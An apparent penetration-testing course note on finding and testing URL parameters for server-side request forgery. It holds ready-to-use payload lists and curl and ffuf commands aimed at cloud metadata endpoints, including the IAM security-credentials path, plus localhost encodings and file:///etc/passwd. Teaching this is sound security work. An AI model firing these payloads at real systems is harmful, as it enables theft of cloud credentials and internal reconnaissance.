---
tags: [vapt, ssrf, beginner]
difficulty: beginner
module: "13 - SSRF"
topic: "13.03 SSRF via URL Parameters"
---

# 13.03 — SSRF via URL Parameters

## Finding URL Parameters

```
URL PARAMETERS THAT COMMONLY LEAD TO SSRF:

OBVIOUS NAMES:
  ?url=
  ?uri=
  ?link=
  ?src=
  ?source=
  ?href=
  ?path=
  ?page=
  ?file=
  ?redirect=
  ?target=
  ?dest=
  ?destination=
  ?redir=
  ?return=
  ?return_to=
  ?next=
  ?continue=

LESS OBVIOUS (but still SSRF prone):
  ?api=
  ?proxy=
  ?fetch=
  ?request=
  ?ip=
  ?host=
  ?domain=
  ?callback=
  ?image=
  ?img=
  ?load=
  ?feed=
  ?data=
  ?document=
  ?pdf=
  ?content=
  ?import=
  ?endpoint=
  ?server=
  ?webhook=
```

---

## Finding SSRF Targets in Burp

```
BURP METHODOLOGY:

1. BROWSE THE APPLICATION:
   - Click every feature
   - Submit every form
   - Especially: image uploads, URL imports, webhooks, link preview

2. HTTP HISTORY → SEARCH:
   - Filter: Request body contains "http"
   - Filter: URL parameter contains "url"
   - Look for any full URL in parameters or headers

3. SITE MAP:
   - Right-click → Extensions → Active scan for SSRF
   (Burp Pro scanner detects SSRF)

4. GREP FOR URL PATTERNS:
   In Burp → Search → Regex: (url|src|href|link|path|target|dest|redirect)=https?://
```

---

## Testing URL Parameters for SSRF

```bash
# BASIC TEST — REPLACE URL WITH INTERNAL:
# Original: GET /proxy?url=https://external-api.com/data
# Attack:   GET /proxy?url=http://169.254.169.254/latest/meta-data/

# WITH BURP REPEATER:
# 1. Find request with URL parameter
# 2. Send to Repeater
# 3. Replace URL value with: http://127.0.0.1/
# 4. Check if response differs from external URL

# AUTOMATED WITH FFUF:
ffuf -u "https://target.com/fetch?url=FUZZ" \
  -w ssrf_payloads.txt \
  -H "Cookie: session=YOURS" \
  -v

# SSRF PAYLOADS FILE:
cat > ssrf_payloads.txt << 'EOF'
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/
http://10.0.0.1/
http://192.168.1.1/
http://[::1]/
http://0.0.0.0/
http://2130706433/
http://017700000001/
file:///etc/passwd
EOF
```

---

## POST Body URL Parameters

```bash
# SSRF IN POST BODY:
# Original:
# POST /api/import
# {"url": "https://example.com/data.json"}

# Attack:
curl -X POST "https://target.com/api/import" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOURS" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# OR WITH FORM DATA:
curl -X POST "https://target.com/api/import" \
  -H "Cookie: session=YOURS" \
  -d "url=http://169.254.169.254/latest/meta-data/"

# CHECK RESPONSE:
# Contains AWS metadata? → CRITICAL SSRF!
# Error mentioning "169.254"? → Filtered, but SSRF may exist
# Different error from normal URL? → SSRF likely, try bypass
```

---

## SSRF in JSON API Bodies

```javascript
// FIND IN BURP HTTP HISTORY:
// POST /api/webhook
// {"callback_url": "https://your-server.com/endpoint"}

// ATTACK:
POST /api/webhook HTTP/1.1
Content-Type: application/json
Cookie: session=YOURS

{"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

// OTHER JSON SSRF TARGETS:
// "image_url": "http://..."
// "avatar_url": "http://..."
// "logo_url": "http://..."
// "feed_url": "http://..."
// "import_url": "http://..."
// "api_endpoint": "http://..."
// "server": "http://..."
// "host": "127.0.0.1"
// "ip": "169.254.169.254"
```

---

## Identifying SSRF via Response Differences

```
RESPONSE ANALYSIS:
  Test 1: url=https://httpbin.org/get  (legit external URL)
  Test 2: url=http://127.0.0.1/       (localhost)
  Test 3: url=http://999.999.999.999/ (non-routable IP — control)
  
  Compare responses:
  Test 1 → 200 OK, content from httpbin.org
  Test 2 → ???
    If same/similar structure → SSRF! Content from localhost!
    If "Connection refused" → SSRF! (but nothing on port 80)
    If "SSRF blocked" → Filter exists, try bypass
    If timeout → May be filtered or port blocked
  Test 3 → timeout or error (baseline for blocked IPs)

TIMING-BASED SSRF DETECTION:
  Internal IP exists: fast response (10-100ms)
  Internal IP doesn't exist: slow timeout (5-10 seconds)
  This timing difference leaks network topology!
```

---

## Wordlist for SSRF Parameter Discovery

```bash
# USE PARAMSPIDER TO FIND URL PARAMETERS:
pip install paramspider
paramspider -d target.com -o params.txt

# USE WAYBACKURLS TO FIND HISTORICAL PARAMS:
echo "target.com" | waybackurls | grep -E "[?&](url|uri|link|src|redirect|target|dest|page|path|next|ref|fetch|api|proxy|image|webhook)=" | sort -u

# USE ARJUN FOR PARAM DISCOVERY:
pip install arjun
arjun -u https://target.com/api/fetch -m GET
arjun -u https://target.com/api/import -m POST
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[02 - Basic SSRF Fetching Internal URLs]] — what to target
- [[04 - SSRF via HTTP Headers]] — headers as attack vector
- [[07 - Blind SSRF]] — when no response is returned
- [[14 - SSRF Localhost Bypass]] — bypass filter techniques
- [[17 - SSRF WAF Bypass]] — WAF bypass techniques
